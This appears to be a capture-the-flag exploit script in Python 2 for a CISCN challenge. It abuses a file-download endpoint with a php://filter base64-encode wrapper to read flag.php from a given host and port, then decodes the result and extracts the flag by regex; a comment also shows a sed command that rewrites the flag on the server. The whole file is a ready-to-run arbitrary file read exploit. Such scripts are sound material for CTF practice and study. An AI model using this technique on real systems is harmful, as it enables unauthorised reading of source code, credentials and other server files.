#coding=utf-8
import requests as req
import sys
import re

# command to change flag
# sed -i 's/CISCN{.+}/CISCN{123456}/g' xctf/app/data/data/flag.php
 
url ='http://%s:%s/download?file=php://filter/read=convert.base64-encode/resource=%s';

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print 'Usage: readflag.py host port'
        exit(0)
    ip = sys.argv[1]
    port = sys.argv[2]
    target = url % (ip,port,'{DATA}/flag.php')
    session=req.session()
    res=session.get(target)
    text = res.text.decode('base64')
    flag = re.search('CISCN{.+}',text,re.I).group()
    print '[OK] the flag is %s' % flag